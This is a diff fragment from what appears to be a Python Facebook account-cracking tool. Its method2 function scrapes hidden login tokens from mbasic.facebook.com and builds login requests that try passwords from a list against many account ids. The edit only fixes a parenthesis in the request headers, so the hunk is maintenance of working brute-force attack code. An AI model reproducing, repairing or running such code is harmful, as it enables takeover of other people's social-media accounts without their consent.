@@ -445,7 +445,7 @@ def method2(ids,names,passlist,total_ids):
             url = 'https://mbasic.facebook.com/?ref=opera_speed_dial_freefb'
             raw = session.get(url).text
             payload = {"lsd":re.search('name="lsd" value="(.*?)"', str(raw)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(raw)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(raw)).group(1),"li":re.search('name="li" value="(.*?)"', str(raw)).group(1),"try_number":"0","unrecognized_tries":"0","email":ids,"pass":pas,"login":"Log In"}
-            header = ({'authority': 'www.facebook.com',
+            header = {'authority': 'www.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
             'cache-control': 'max-age=0',
